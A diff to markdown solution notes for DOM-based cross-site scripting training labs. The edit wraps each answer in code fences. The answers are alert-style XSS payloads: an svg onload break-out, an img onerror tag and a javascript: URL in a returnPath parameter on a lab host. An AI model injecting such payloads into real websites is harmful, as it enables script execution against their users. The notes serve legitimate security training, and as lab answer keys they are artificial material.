@@ -617,7 +617,10 @@ you can control using the website URL.
 To solve this lab, perform a cross-site scripting attack that calls the
 alert function.
 
-**Resolution : "><svg onload=alert(1)>**
+**Resolution :
+```
+"><svg onload=alert(1)>**
+```
 
 **Lab: DOM XSS in innerHTML sink using source location.search**
 
@@ -629,7 +632,10 @@ location.search.
 To solve this lab, perform a cross-site scripting attack that calls the
 alert function.
 
-Resolution: <img src=1 onerror=alert(1)>
+Resolution: 
+```
+<img src=1 onerror=alert(1)>
+```
 
 **Lab: DOM XSS in jQuery anchor href attribute sink using
 location.search source**
@@ -641,7 +647,9 @@ from location.search.
 
 To solve this lab, make the "back" link alert document.cookie.
 
+```
 https://0adf00fc0445233780ecdf9b0084001a.web-security-academy.net/feedback?returnPath=javascript:alert(1)
+```
 
 **Lab: DOM XSS in jQuery selector sink using a hashchange event**
 
